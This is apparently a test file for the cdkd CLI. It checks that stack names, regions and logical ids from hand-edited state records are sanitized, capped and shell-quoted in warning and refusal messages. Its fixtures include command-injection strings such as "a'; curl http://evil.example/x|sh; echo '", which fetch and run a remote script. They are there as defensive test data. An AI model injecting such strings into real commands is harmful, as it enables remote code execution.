    expect(command.endsWith('--json')).toBe(true);
    // BYTE-IDENTICAL to the command BOTH siblings build from the same inputs —
    // pinning the shared sanitize-then-shell-quote path rather than re-spelling
    // `shellQuote`'s output here. This module now hand-spells that command in
    // THREE places, so pinning against only one of the two siblings would let
    // the unpinned pair drift apart (review of go-to-k/cdkd#3194).
    expect(malformedResourcesWarning(evil, 'us-east-1')).toContain(command);
    expect(malformedRenderedContainersWarning(evil, 'us-east-1', ['outputs'])).toContain(command);
    expect(command).not.toContain(`show ${evil} `);
  });

  it('keeps a control-bearing identifier on ONE line, so it cannot forge a row', () => {
    const w = malformedOutputsWarning(
      `Evil${String.fromCharCode(0x1b)}[31m\nStack: Decoy`,
      'us-east-1'
    );
    expect(w.split('\n')).toHaveLength(1);
    expect(w).not.toContain(String.fromCharCode(0x1b));
  });

  it('renders an identifier that sanitizes to EMPTY as a placeholder, not nothing', () => {
    // An empty argument makes `--stack-region` swallow the next flag, turning
    // the remedy into a differently-broken command. Built from escapes rather
    // than literal bytes, so `grep` does not read this file as binary.
    const w = malformedOutputsWarning('S', String.fromCharCode(0x00, 0x01));
    expect(w).toContain(UNRENDERABLE);
  });
});

describe('refuseMalformedState', () => {
  for (const [label, value] of UNREADABLE) {
    it(`refuses ${label} with a named code rather than a bare TypeError`, () => {
      let thrown: unknown;
      try {
        refuseMalformedState(state(value), 'MyStack', 'eu-west-1');
      } catch (err) {
        thrown = err;
      }
      expect(thrown).toBeInstanceOf(CdkdError);
      expect((thrown as CdkdError).code).toBe(STATE_RESOURCES_MALFORMED);
      expect((thrown as CdkdError).message).toContain('MyStack');
      // The refusal has to say WHY a write-capable command will not proceed,
      // or it reads as the same unhelpful abort go-to-k/cdkd#3018 reported.
      expect((thrown as CdkdError).message).toContain('WRITE');
    });
  }

  it('passes a readable bag through, empty included', () => {
    expect(() => refuseMalformedState(state({}), 'S', 'r')).not.toThrow();
    expect(() => refuseMalformedState(state({ A: {} }), 'S', 'r')).not.toThrow();
  });
});

describe('the entry-level text', () => {
  it('caps the names it prints and says how many it did not', () => {
    const ids = ['A1', 'B2', 'C3', 'D4', 'E5', 'F6', 'G7'];
    const message = malformedResourceEntriesRefusalMessage('MyStack', 'eu-west-1', ids);
    for (const named of ids.slice(0, 5)) expect(message).toContain(named);
    // The cap is the reason the remedy command survives on screen at all, so
    // the ones past it must be COUNTED rather than silently dropped.
    expect(message).not.toContain('F6');
    expect(message).not.toContain('G7');
    expect(message).toContain('and 2 more');
    expect(message).toContain('7 resource record(s)');
  });

  it('does not say "and 0 more" at EXACTLY the cap', () => {
    // FIVE names against a five-name cap — the boundary itself. With two names
    // the `rest > 0` test could be widened to `rest >= 0` and survive, so the
    // case would credit a boundary it never reached.
    const message = malformedResourceEntriesRefusalMessage('S', 'r', [
      'A1',
      'B2',
      'C3',
      'D4',
      'E5',
    ]);
    expect(message).toContain('A1');
    expect(message).toContain('E5');
    // The SUMMARY clause, not the word: the refusal's own prose already says
    // "with no more to go on", so a bare `not.toContain('more')` fails on
    // correct text — it did, which is why this is a shape.
    expect(message).not.toMatch(/and \d+ more/);

    // BELOW the cap as well as AT it. `rest > 0` widened to `rest !== 0` is
    // true for every count under the cap, so a single unreadable entry would
    // print "and -4 more" — an arm the exact-cap case cannot reach.
    for (const count of [1, 2, 3, 4]) {
      const ids = Array.from({ length: count }, (_, i) => `R${i}`);
      for (const [label, text] of [
        ['the refusal', malformedResourceEntriesRefusalMessage('S', 'r', ids)],
        ['the warning', malformedResourceEntriesWarning('S', 'r', ids)],
      ] as const) {
        expect(text, `${label}: ${count} names below the cap gained a summary`).not.toMatch(
          /and -?\d+ more/
        );
      }
    }
  });

  it('sanitizes and caps a planted logical id — it is read out of the record', () => {
    // A logical id reaches this text from the same hand-edited record the
    // message is about, so it is no more trusted than the stack name beside
    // it. Unsanitized it could forge a line and append its own instruction to
    // the command this text tells the reader to run; uncapped it could push
    // that command off the screen.
    const FORGERIES = ['\u001b', '\u0085', '\u2028', '\u202e', '\n', '\r', '\u200b'];
    const hostile = `Evil${FORGERIES.join('')}Row`;
    for (const forge of FORGERIES) {
      expect(hostile.includes(forge), `probe input lost ${JSON.stringify(forge)}`).toBe(true);
    }
    const message = malformedResourceEntriesRefusalMessage('S', 'r', [
      hostile,
      'z'.repeat(5000),
    ]);
    for (const forge of FORGERIES) expect(message).not.toContain(forge);
    // At CloudFormation's 255, not a region's 128: a legitimate 129-to-255-
    // character CDK id cut shorter names a row the record does not hold.
    expect(message).toContain(`${'z'.repeat(255)} [cut: 4745 more characters withheld]`);
    expect(message).not.toContain('z'.repeat(256));
    // A logical id with nothing renderable left takes the stand-in too, not an
    // empty pair of quotes naming nothing. Its own fixture, because the stack
    // and region stand-ins are asserted separately and a shared
    // `toContain(UNRENDERABLE)` would pass on any one of the three.
    const blankId = malformedResourceEntriesRefusalMessage('S', 'r', ['\u0000\u0001']);
    expect(blankId).toContain(`— ${UNRENDERABLE} —`);
    // The remedy is still on screen after the cap — a DISTANCE, the same oracle
    // the rendered-containers case uses and for the same reason.
    expect(message.length).toBeLessThan(1200);
  });

  it("the ORPHAN warning caps, counts and sanitizes its ids like its `resources` sibling", () => {
    // The clauses the new text does not inherit by being a copy: the five-name
    // cap, the overflow suffix and `displayLogicalId`. Each was a surviving
    // mutant until this case (round-5 proxy pass).
    const six = malformedOrphanRecordsWarning('S', 'r', ['A1', 'B2', 'C3', 'D4', 'E5', 'F6']);
    expect(six).toContain('A1, B2, C3, D4, E5 and 1 more');
    // Dropping the `.slice` prints the sixth name; this is the assertion that
    // sees it.
    expect(six).not.toContain('F6');

    // EXACTLY at the cap: no overflow suffix, so `rest >= 0` reds here.
    const five = malformedOrphanRecordsWarning('S', 'r', ['A1', 'B2', 'C3', 'D4', 'E5']);
    expect(five).toContain('A1, B2, C3, D4, E5 —');
    expect(five).not.toContain('more');

    // The ids go through `displayLogicalId`, not a bare interpolation: a
    // padded id is QUOTED so it cannot imitate a healthy sibling, a control
    // byte never reaches the terminal, and a long one is cut with the marker.
    const hostile = malformedOrphanRecordsWarning('S', 'r', [
      'Bucket ',
      'E\u001b[31mvil',
      'q'.repeat(IDENT_MAX_CODE_POINTS + 50),
    ]);
    // Trimmed by the sanitizer and then QUOTED, which is what keeps it
    // visibly distinct from a healthy `Bucket`.
    expect(hostile).toContain('"Bucket"');
    expect(hostile).not.toContain('\u001b');
    expect(hostile).toContain('characters withheld');
    expect(hostile).not.toContain('q'.repeat(IDENT_MAX_CODE_POINTS + 1));
    // ...and an id-less record renders as the stand-in rather than empty.
    expect(malformedOrphanRecordsWarning('S', 'r', [''])).toContain(UNRENDERABLE);
  });

  it('EVERY message builder caps a stack by the stack rule and a region by the region rule', () => {
    // The invariant rather than one site of it. The cap used to be a DEFAULTED
    // parameter whose default was the region's, and stack sites that forgot to
    // pass the wider one were found one at a time across two review rounds —
    // the last of them in `malformedOutputsWarning`, which no case here reached
    // with a long name. Every builder, and every OCCURRENCE in each: the entry
    // texts print the stack twice, and a `toContain` on the long run would pass
    // with either copy cut short.
    //
    // EXCLUDED, with the reason rather than by omission:
    // `divergentRecordRegionRefusalMessage` (go-to-k/cdkd#3328) measures and
    // prints its KEY region at the state-record grammar's cap rather than a
    // region's 128, which its own note argues for — so it is the one builder
    // this invariant does not hold for. Excluding it here is what would leave
    // its caps pinned nowhere, so the case below pins them instead.
    const STACK = 'Q'.repeat(5000);
    const REGION = 'R'.repeat(5000);
    const builders: ReadonlyArray<readonly [string, string]> = [
      ['malformedStateRefusalMessage', malformedStateRefusalMessage(STACK, REGION)],
      ['malformedResourcesWarning', malformedResourcesWarning(STACK, REGION)],
      ['malformedOutputsWarning', malformedOutputsWarning(STACK, REGION)],
      ['malformedOutputsRefusalMessage', malformedOutputsRefusalMessage(STACK, REGION)],
      ['malformedExportSourceWarning', malformedExportSourceWarning(STACK, REGION)],
      ['malformedExportNamesWarning', malformedExportNamesWarning(STACK, REGION)],
      [
        'malformedRenderedContainersWarning',
        malformedRenderedContainersWarning(STACK, REGION, ['outputs']),
      ],
      ['malformedResourceEntriesWarning', malformedResourceEntriesWarning(STACK, REGION, ['X'])],
      ['malformedOrphanRecordsWarning', malformedOrphanRecordsWarning(STACK, REGION, ['X'])],
      [
        'malformedResourceEntriesRefusalMessage',
        malformedResourceEntriesRefusalMessage(STACK, REGION, ['X']),
      ],
      ['malformedDestroyOutputsRefusalMessage', malformedDestroyOutputsRefusalMessage(STACK, REGION)],
      [
        'malformedNestedChildOutputsRefusalMessage',
        malformedNestedChildOutputsRefusalMessage(STACK, REGION),
      ],
      ['malformedLocalOutputsWarning', malformedLocalOutputsWarning(STACK, REGION)],
      // The destroy refusal is absent on purpose: a 5000-character name fails
      // its exactness gate, and the withhold arm prints no identity at all.
      [
        'malformedDeployResourcesRefusalMessage',
        malformedDeployResourcesRefusalMessage(STACK, REGION),
      ],
      [
        'malformedResourcePropertiesRefusalMessage',
        malformedResourcePropertiesRefusalMessage(STACK, REGION, ['X']),
      ],
      [
        'malformedResourcePropertiesWarning',
        malformedResourcePropertiesWarning(STACK, REGION, ['X']),
      ],
      [
        'malformedOrphanResourcePropertiesRefusalMessage',
        malformedOrphanResourcePropertiesRefusalMessage(STACK, REGION, ['X']),
      ],
    ];
    for (const [name, text] of builders) {
      // Runs of three or more, so an ordinary capitalised word in the prose
      // cannot be read as a cut identifier.
      const stackRuns = (text.match(/Q{3,}/g) ?? []).map((run) => run.length);
      const regionRuns = (text.match(/R{3,}/g) ?? []).map((run) => run.length);
      expect(stackRuns.length, `${name} printed no stack`).toBeGreaterThan(0);
      expect(regionRuns.length, `${name} printed no region`).toBeGreaterThan(0);
      expect(stackRuns, `${name} cut a stack name at the wrong cap`).toEqual(
        stackRuns.map(() => 1152)
      );
      expect(regionRuns, `${name} cut a region at the wrong cap`).toEqual(
        regionRuns.map(() => 128)
      );
    }
  });

  it('caps the EXCLUDED builder at the state-record grammar on BOTH identifiers', () => {
    // The exclusion above is what would otherwise leave
    // `divergentRecordRegionRefusalMessage`'s caps pinned nowhere:
    // `state-key-region-authority.test.ts` covers trimming, character
    // substitution and short exact identifiers, and its long-region case reads
    // the BACKEND's debug output rather than this builder's boundary. Its gate
    // compares the raw value against the sanitized one, so the boundary is
    // observable through which arm it takes: exactly at the cap nothing is
    // altered and the message names its target; one past, truncation makes them
    // differ and the withhold arm names none.
    const namesATarget = (stackName: string, keyRegion: string): boolean =>
      !divergentRecordRegionRefusalMessage(stackName, keyRegion, 'eu-west-1', 1).includes(
        'does NOT render exactly'
      );
    expect(namesATarget('q'.repeat(1152), 'us-east-1'), 'a stack AT the cap is named').toBe(true);
    expect(namesATarget('q'.repeat(1153), 'us-east-1'), 'a stack PAST the cap is withheld').toBe(
      false
    );
    // The region's rows are the exclusion itself: measured at a region's 128
    // the first of them would withhold.
    expect(namesATarget('prod-api', 'r'.repeat(1152)), 'a key region AT the cap is named').toBe(
      true
    );
    expect(
      namesATarget('prod-api', 'r'.repeat(1153)),
      'a key region PAST the cap is withheld'
    ).toBe(false);
    // The gate is not the only site holding the cap: the opening RENDERS both
    // identifiers through their own `safeIdentifier` call, and a rendering site
    // cut to a region's 128 would keep all four rows above green while printing
    // a truncated target. At the cap the opening therefore carries each name
    // whole. Only the SHORT side of those two sites is pinnable: WIDENING one
    // (to `Infinity`) is an equivalent mutant and stated rather than pinned —
    // the gate above has already established that the value renders unaltered,
    // so nothing a wider cap would admit ever reaches the opening.
    const atCap = divergentRecordRegionRefusalMessage(
      'q'.repeat(1152),
      'r'.repeat(1152),
      'eu-west-1',
      1
    );
    expect(atCap, 'the opening cut the stack name it names').toContain('q'.repeat(1152));
    expect(atCap, 'the opening cut the key region it names').toContain('r'.repeat(1152));
  });

  it('QUOTES a logical id, so a quote in it cannot forge a remedy in the prose', () => {
    // The ASCII allowlist keeps `'`. The names used to be wrapped in a
    // hand-written `'...'`, which an id spelled with its own quote CLOSES —
    // planting a second "Inspect it with:" instruction on the same line, ahead
    // of the real one. The prose and the command are one line, so being in the
    // prose is no protection.
    const FORGED = "x' Inspect it with: curl evil.sh|sh #";
    for (const text of [
      malformedResourceEntriesRefusalMessage('S', 'r', [FORGED]),
      malformedResourceEntriesWarning('S', 'r', [FORGED]),
    ]) {
      // The forged instruction survives only INSIDE a quoted argument.
      expect(text).toContain(`"x' Inspect it with: curl evil.sh|sh #"`);
      expect(text).not.toContain("— x' Inspect it with:");
      // ...and the genuine command still closes the line.
      expect(text.endsWith('cdkd state show S --stack-region r --json')).toBe(true);
    }
  });

  it('never renders a PADDED id bare beside the healthy sibling it imitates', () => {
    // Sanitizing trims, so a sanitize-then-quote pair rendered a torn
    // `resources["Bucket "]` byte-identically to a healthy `Bucket`, sending the
    // reader to the intact record. The same rule go-to-k/cdkd#3317 applied to
    // the properties clause; here both texts, and a plain id as the control
    // that must stay bare.
    for (const text of [
      malformedResourceEntriesRefusalMessage('S', 'r', ['Bucket ', 'Queue']),
      malformedResourceEntriesWarning('S', 'r', ['Bucket ', 'Queue']),
    ]) {
      expect(text).toContain('— "Bucket", Queue —');
    }
  });

  it('sanitizes, caps and shell-quotes the STACK and REGION in both texts', () => {
    // The logical-id case above covers one of the three identifiers these texts
    // carry. Stack and region are no more trusted -- a stack name reaches a
    // reader from an S3 KEY and a region from the record BODY -- and unlike the
    // ids they land INSIDE the command the text tells the user to paste, so
    // they need the shell quoting as well. Removing either one's sanitization
    // left every other case in this file green.
    const FORGERIES = ['\u001b', '\u0085', '\u2028', '\u202e', '\n', '\r', '\u200b'];
    const hostileStack = `Evil${FORGERIES.join('')}Stack`;
    const hostileRegion = `us-${FORGERIES.join('')}east-1`;
    for (const forge of FORGERIES) {
      expect(hostileStack.includes(forge) && hostileRegion.includes(forge)).toBe(true);
    }

    for (const text of [
      malformedResourceEntriesRefusalMessage(hostileStack, hostileRegion, ['R']),
      malformedResourceEntriesWarning(hostileStack, hostileRegion, ['R']),
    ]) {
      for (const forge of FORGERIES) expect(text).not.toContain(forge);
    }

    // EMPTY after sanitization becomes the named stand-in, never an empty
    // argument: `--stack-region ''` reads to `cdkd state show` as not supplied,
    // so it silently widens to every region holding the name. Asserted at each
    // ARGUMENT of each command — the shared diagnosis above the command also
    // prints both identifiers, so a `toContain(UNRENDERABLE)` over the whole
    // text passes with both command arguments left empty.
    for (const [label, build] of [
      ['the refusal', malformedResourceEntriesRefusalMessage],
      ['the warning', malformedResourceEntriesWarning],
    ] as const) {
      expect(
        build('\u0000\u0001', 'r', ['R']),
        `${label}: an unrenderable STACK no longer stands in inside the command`
      // QUOTED: `shellQuote` quotes the stand-in because of its angle
      // brackets, which is the point — an empty argument would not be there
      // at all, and `--stack-region` would swallow `--json`.
      ).toContain(`cdkd state show '${UNRENDERABLE}' --stack-region r --json`);
      expect(
        build('S', '\u0000', ['R']),
        `${label}: an unrenderable REGION no longer stands in inside the command`
      ).toContain(`cdkd state show S --stack-region '${UNRENDERABLE}' --json`);
    }

    // SHELL-QUOTED inside the command: the ASCII allowlist keeps the quote, `;`
    // and `|`, so an unquoted name would close the quoting and append its own
    // command to the line the text says to run. Spelled from raw literals
    // rather than by calling `shellQuote`, so the expected values are
    // independent of the code under test.
    // EACH command ARGUMENT of EACH text, independently. One probe on the
    // refusal's stack left three other positions unpinned: the warning's stack,
    // the warning's region and the refusal's region each quote separately, and
    // removing any one of them survived a single combined assertion.
    const HOSTILE_ARG = "a'; curl http://x|sh; echo '";
    const QUOTED_ARG = String.raw`'a'\''; curl http://x|sh; echo '\'''`;
    for (const [label, build] of [
      ['the refusal', malformedResourceEntriesRefusalMessage],
      ['the warning', malformedResourceEntriesWarning],
    ] as const) {
      // Asserted as the WHOLE TAIL after each text's own command introducer,
      // not with `toContain`: the contract is LAST and UNWRAPPED, and a
      // containment check accepts both mutants that break it — prose appended
      // after `--json`, and an outer `'...'` wrapper, which composes with
      // `shellQuote`'s own quoting into something unpastable.
      const marker = label === 'the refusal' ? 'Inspect it with: ' : 'See the stored values with: ';
      const tail = (text: string): string => {
        expect(text, `${label}: the command introducer is gone`).toContain(marker);
        return text.slice(text.indexOf(marker) + marker.length);
      };
      expect(
        tail(build(HOSTILE_ARG, 'r', ['R'])),
        `${label}: the stack argument is no longer shell-quoted, or the command is not last`
      ).toBe(`cdkd state show ${QUOTED_ARG} --stack-region r --json`);
      expect(
        tail(build('S', HOSTILE_ARG, ['R'])),
        `${label}: the region argument is no longer shell-quoted, or the command is not last`
      ).toBe(`cdkd state show S --stack-region ${QUOTED_ARG} --json`);
      // ...and each is CAPPED in its own text, not only in the one the
      // distance assertion above measured.
      // The STACK takes `STACK_REF_MAX_CODE_POINTS` (1152), not an identifier's
      // 128: a cdkd record's stack name is `parent~child` applied recursively,
      // so 128 truncated a legitimate nested name and the remedy command then
      // named a stack that does not exist.
      const longStack = build('q'.repeat(5000), 'r', ['R']);
      expect(longStack, `${label}: the stack argument is no longer capped`).toContain(
        `${'q'.repeat(1152)}...`
      );
      expect(longStack, `${label}: the stack cap widened past the stack-ref bound`).not.toContain(
        'q'.repeat(1153)
      );
      // The DIAGNOSIS half carries the wider cap too, not only the remedy
      // command: they are separate `safeIdentifier` calls, so capping one at an
      // identifier's 128 while the other keeps 1152 passes an assertion that
      // looks at the message as a whole.
      expect(
        longStack.slice(0, longStack.indexOf('cannot be read as resources')),
        `${label}: the DIAGNOSIS still caps the stack name at an identifier's width`
      ).toContain(`${'q'.repeat(1152)}...`);
      expect(longStack.length).toBeLessThan(3000);
      const longRegion = build('S', 'r'.repeat(5000), ['R']);
      expect(longRegion, `${label}: the region argument is no longer capped`).toContain(
        `${'r'.repeat(128)}...`
      );
      expect(longRegion.length).toBeLessThan(1200);
    }
  });

  it('BOTH texts forward the whole list, named and counted the same way', () => {
    // The refusal's forwarding is pinned by its own multi-entry case; this is
    // the WARNING's, which plain `cdkd drift` and `cdkd diff --recursive` emit.
    // A slice on either call site drops rows from the only report a read-only
    // command gives, and the two are separate call sites into the shared
    // clause, so one fixture cannot cover both.
    const ids = ['A1', 'B2', 'C3', 'D4', 'E5', 'F6'];
    for (const [label, text] of [
      ['the refusal', malformedResourceEntriesRefusalMessage('S', 'r', ids)],
      ['the warning', malformedResourceEntriesWarning('S', 'r', ids)],
    ] as const) {
      expect(text, `${label}: the total is no longer the whole list`).toContain(
        '6 resource record(s)'
      );
      for (const id of ids.slice(0, 5)) {
        expect(text, `${label}: ${id} is no longer named`).toContain(id);
      }
      expect(text, `${label}: the overflow summary is gone`).toContain('and 1 more');
      expect(text, `${label}: a capped-out id is named anyway`).not.toContain('F6');
    }
  });

  it('the warning and the refusal share a diagnosis and differ in what happens next', () => {
    const ids = ['Row1'];
    const refusal = malformedResourceEntriesRefusalMessage('MyStack', 'eu-west-1', ids);
    const warning = malformedResourceEntriesWarning('MyStack', 'eu-west-1', ids);
    // One spelling of WHAT IS WRONG — two copies of a diagnosis is what drifts,
    // which is the whole reason the clause is shared in the module.
    const diagnosis = 'because they are not objects, or carry no resource type';
    expect(refusal).toContain(diagnosis);
    expect(warning).toContain(diagnosis);
    // The DIAGNOSIS carries the pair too, and it is a second forwarding hop
    // from the command's: spelling the region as a second copy of the stack
    // name left both remedy commands correct and every other case green, while
    // the sentence told the reader the record lives somewhere it does not.
    expect(refusal).toContain("State for MyStack (eu-west-1)");
    expect(warning).toContain("State for MyStack (eu-west-1)");
    // ...and the DIAGNOSIS quotes both identifiers as well, which the remedy
    // tails above do not establish: dropping `shellQuote` from either one there
    // left every case green, because the only hostile fixtures reached the
    // command. A name carrying a space renders unquoted as two words and reads
    // as a different record.
    const SPACED = 'my stack';
    expect(
      malformedResourceEntriesRefusalMessage(SPACED, 'eu west 1', ['R']),
      'the refusal diagnosis no longer quotes its identifiers'
    ).toContain("State for 'my stack' ('eu west 1')");
    expect(
      malformedResourceEntriesWarning(SPACED, 'eu west 1', ['R']),
      'the warning diagnosis no longer quotes its identifiers'
    ).toContain("State for 'my stack' ('eu west 1')");
    // ...and opposite verdicts, so neither text can be swapped for the other.
    expect(refusal).toContain('refuses');
    expect(warning).toContain('Continuing WITHOUT them');
    expect(warning).not.toContain('refuses');
  });
});

describe('the user-facing text', () => {
  it('names the record and forbids the two commands that would act on it', () => {
    const warning = malformedResourcesWarning('MyStack', 'eu-west-1');
    expect(warning).toContain('MyStack');
    expect(warning).toContain('eu-west-1');
    // An empty resource set is indistinguishable from a healthy empty stack in
    // every later line of output, so the warning has to say which it is.
    expect(warning).toContain('EMPTY');
    expect(warning).toContain('cdkd deploy');
    expect(warning).toContain('cdkd destroy');
  });

  it('sanitizes both interpolations — they land inside a pasteable command', () => {
    // A stack name reaches the cross-stack read path from an Fn::GetStackOutput
    // argument or an S3 key, and ConsoleLogger sanitizes a logger's extra ARGS,
    // never the message string. Unsanitized, a name could forge a line break
    // and append its own instruction to the command the text says to run, or
    // hide the real one behind an ANSI sequence.
    const FORGERIES = ['\u001b', '\u0085', '\u2028', '\u202e', '\n', '\r'];
    const hostile = `Evil${FORGERIES.join('')}Stack`;
    // Non-vacuity: the probe input must actually carry every forgery, or the
    // assertions below pass over a string that never had them.
    for (const forge of FORGERIES) {
      expect(hostile.includes(forge), `probe input lost ${JSON.stringify(forge)}`).toBe(true);
    }

    const texts = [malformedResourcesWarning(hostile, hostile)];
    try {
      refuseMalformedState(state(null), hostile, hostile);
    } catch (err) {
      texts.push((err as Error).message);
    }
    expect(texts.length, 'refuseMalformedState did not throw for a null bag').toBe(2);

    for (const text of texts) {
      for (const forge of FORGERIES) {
        expect(
          text.includes(forge),
          `rendered text still carries ${JSON.stringify(forge)}: ${JSON.stringify(text)}`
        ).toBe(false);
      }
      // And the sanitizer must not have eaten the identifier entirely — the
      // message has to still name WHICH record is broken.
      expect(text).toContain('Evil');
      expect(text).toContain('Stack');
    }
  });

  it('shell-quotes the remedy, so a hostile name cannot append its own command', () => {
    // displaySafe(asciiOnly) is a printable-ASCII allowlist: it removes the
    // control-character class above but KEEPS ' ; | ` $ and spaces. The
    // previous cut wrapped the command in '...' with only that sanitizing, so
    // this name closed the quoting and appended a command to the line the text
    // tells the user to RUN.
    const INJECTION = "a'; curl http://evil.example/x|sh; echo '";
    // BOTH arguments, and both orders. The region side is interpolated into
    // the same command and was unfenced: passing a benign `us-east-1` there
    // made `shellQuote(reg)` deletable with no test noticing, since shellQuote
    // returns an ordinary region unquoted anyway.
    const texts: string[] = [
      malformedResourcesWarning(INJECTION, 'us-east-1'),
      malformedResourcesWarning('MyStack', INJECTION),
    ];
    for (const [stack, region] of [
      [INJECTION, 'us-east-1'],
      ['MyStack', INJECTION],
    ] as const) {
      try {
        refuseMalformedState(state(null), stack, region);
      } catch (err) {
        texts.push((err as Error).message);
      }
    }
    expect(texts.length).toBe(4);

    for (const text of texts) {
      // The PROSE carries both identifiers too and was outside every probe,
      // so check the whole text, not only the command tail.
      expect(text, 'the hostile value never reached the rendered text').toContain('curl');
      const command = text.slice(text.indexOf('cdkd state show'));
      expect(command, 'the remedy command is missing').toContain('cdkd state show');
      // Inside a single-quoted shell word, the ONLY way out is a closing quote.
      // shellQuote escapes each one as '\'' so the word never terminates early.
      expect(
        command.includes("|sh") && !command.includes("'\\''"),
        `the remedy still carries an unescaped injection: ${command}`
      ).toBe(false);
    }
  });

  it('renders an identifier that sanitizes to EMPTY as a placeholder, not nothing', () => {
    // An empty argument makes --stack-region swallow --json, turning a remedy
    // into a differently-broken command.
    const text = malformedResourcesWarning('\u0000\u0001', '\u0002');
    expect(text).toContain('<unrenderable>');
    // NOT `not.toContain('--stack-region --json')`: neither regression can emit
    // that exact string -- dropping UNRENDERABLE gives `--stack-region '' --json`
    // and dropping shellQuote gives TWO spaces -- so it could never fail.
    // Assert the positive: a NAMED argument follows the flag.
    expect(text).toMatch(/--stack-region \S+ --json/);
  });

  it('carries the generic exit code — scrub needs a different one and says so', () => {
    // `refuseMalformedState` is a plain CdkdError (exit 1, the generic error).
    // That is right for import / orphan / rollback, and WRONG for scrub, whose
    // exit 1 means "--fail found plaintext" — so scrub raises its own exit-2
    // class around `malformedStateRefusalMessage` instead. A single shared
    // code would be wrong in the other direction too: `cdkd rollback`
    // documents 2 as "PARTIAL — journal kept, idempotent re-run", which would
    // tell an operator to re-run a command that attempted nothing.
    let thrown: CdkdError | undefined;
    try {
      refuseMalformedState(state(null), 'S', 'r');
    } catch (err) {
      thrown = err as CdkdError;
    }
    expect(thrown).toBeDefined();
    expect(
      (thrown as unknown as { exitCode?: number }).exitCode,
      'refuseMalformedState now pins an exitCode; check it against EACH refusing command’s ' +
        'documented contract before adopting it — they disagree.'
    ).toBeUndefined();

    // scrub raises its own class, so its wording CAN drift from this one.
    // `expect(thrown.message).toContain(malformedStateRefusalMessage(...))`
    // would be self-referential -- refuseMalformedState IS that throw -- so
    // the claim is checked where it can actually be false: scrub's source.
    expect(
      code('src/cli/commands/scrub.ts'),
      'scrub no longer raises its refusal through malformedStateRefusalMessage, so its wording ' +
        'can drift from every other refusing command.'
    ).toContain('malformedStateRefusalMessage(');
  });

  it('hasReadableResources is exported, because scrub branches on it directly', () => {
    expect(hasReadableResources(state(null))).toBe(false);
    expect(hasReadableResources(state({}))).toBe(true);
  });

  it('every scrubStack return AFTER the repair carries the finding', () => {
    // The first cut of this signal patched the SAME early-return arm twice and
    // missed the main success path, so a stack whose bag was repaired AND
    // whose outputs held a secret returned without the flag and the finding
    // was lost.
    //
    // Counted on a REQUIRED field rather than by brace-matching the returns: a
    // `[\s\S]*?` span ran past an arm's closing brace and swallowed the next
    // one, which made this fence red for the wrong reason while looking right.
    // `unverifiableReads` appears exactly once per ScrubStackResult literal.
    const src = code('src/cli/commands/scrub.ts');
    const repairAt = src.indexOf('repairMalformedResourcesForReadOnly(state)');
    expect(repairAt, 'scrub no longer repairs under --dry-run').toBeGreaterThan(-1);
    // A CODE anchor, and specifically the CALL in scrubStack's masking-boundary
    // catch. Two earlier spellings were wrong in opposite directions: the
    // comment `THE MASKING BOUNDARY` resolves to -1 now that `src` is
    // comment-stripped (span = rest of file), and `} catch (err) {` matches an
    // INNER catch 901 characters in (span = empty, zero literals, fence
    // vacuous). `maskSecretsInError` is called only in that outer catch and
    // sits after both result literals.
    const endAt = src.indexOf('maskSecretsInError', repairAt);
    expect(endAt, "scrubStack's masking boundary moved; this fence's end anchor is gone").
      toBeGreaterThan(repairAt);

    const body = src.slice(repairAt, endAt);

    // PER LITERAL, not a union total. B1 was a DISTRIBUTION defect — one arm
    // carried the spread twice and the other zero — so `2 spreads across 2
    // literals` was true of the BUG and of the fix alike, and a summed fence
    // passes on the source it exists to reject (measured against both blobs).
    // Splitting on the required field and counting inside each literal is what
    // makes `[2, 0]` distinguishable from `[1, 1]`.
    const perLiteral = body
      .split('unverifiableReads:')
      .slice(1)
      .map((rest) => {
        const close = rest.indexOf('};');
        const literal = close >= 0 ? rest.slice(0, close) : rest;
        return literal.split('malformedResources ? { malformedResources }').length - 1;
      });

    expect(
      perLiteral.length,
      'found fewer than two ScrubStackResult literals after the repair; this fence is ' +
        'asserting nothing'
    ).toBeGreaterThanOrEqual(2);
    // The same count for the `orphans` container (go-to-k/cdkd#3379): a finding
    // dropped from ONE literal is lost for the stacks that return through it,
    // which for this container is a secret-free stack under --dry-run.
    const perLiteralOrphans = body
      .split('unverifiableReads:')
      .slice(1)
      .map((rest) => {
        const close = rest.indexOf('};');
        const literal = close >= 0 ? rest.slice(0, close) : rest;
        return literal.split('malformedOrphans ? { malformedOrphans }').length - 1;
      });
    expect(
      perLiteralOrphans,
      `each ScrubStackResult must carry \`malformedOrphans\` exactly once; got ` +
        `${JSON.stringify(perLiteralOrphans)}. A zero means a stack whose orphans container was ` +
        `repaired returns through that arm with the finding LOST (go-to-k/cdkd#3379).`
    ).toEqual(perLiteralOrphans.map(() => 1));

    expect(
      perLiteral,
      `each ScrubStackResult returned after the repair must carry \`malformedResources\` ` +
        `exactly once; got ${JSON.stringify(perLiteral)}. A zero means a stack whose resources ` +
        `bag was repaired can return through that arm with the finding LOST — ` +
        `\`--dry-run --fail\` then reports a clean run over a record it never read ` +
        `(go-to-k/cdkd#3018). A two means a duplicate spread, which is how the missing one was ` +
        `masked the first time.`
    ).toEqual(perLiteral.map(() => 1));
  });

  it('the malformed-record finding is raised INSIDE the --dry-run branch', () => {
    // The finding is set ONLY under `--dry-run`, and `scrubCommand`'s dry-run
    // branch RETURNS -- so a throw placed after that branch is dead code for
    // it. The first cut did exactly that: `--dry-run --fail` then exited 1 via
    // `ScrubNeededError`, the code reserved for "scrub looked and found a leak
    // -- rotate the secret", which is the opposite remedy; and because that
    // error is `silent: true`, the finding's message never printed either.
    //
    // A source-shape check is what fits here: the defect is the POSITION of a
    // throw relative to a `return`, and `scrubCommand` is behind synthesis.
    const src = code('src/cli/commands/scrub.ts');
    const branchAt = src.indexOf('if (options.dryRun) {');
    expect(branchAt, "scrubCommand's --dry-run branch is gone or renamed").toBeGreaterThan(-1);
    const returnAt = src.indexOf('\n    return;', branchAt);
    expect(returnAt, "the --dry-run branch's own return is gone").toBeGreaterThan(branchAt);

    const branch = src.slice(branchAt, returnAt);
    expect(
      branch,
      'the malformed-record finding is not raised inside the --dry-run branch. It can only be ' +
        'SET under --dry-run, and that branch returns, so a throw below it never runs: the run ' +
        'exits 0, or 1 via the SILENT ScrubNeededError, whose code means the opposite remedy ' +
        '(go-to-k/cdkd#3018).'
    ).toContain('malformedRecords.length > 0');

    // And ABOVE the --fail gate, or ScrubNeededError wins the race and
    // swallows the message.
    expect(
      branch.indexOf('malformedRecords.length > 0'),
      'the finding is raised BELOW `options.fail`, so ScrubNeededError (exit 1, silent) fires ' +
        'first and reports "scrub found a leak" for a record scrub could not read.'
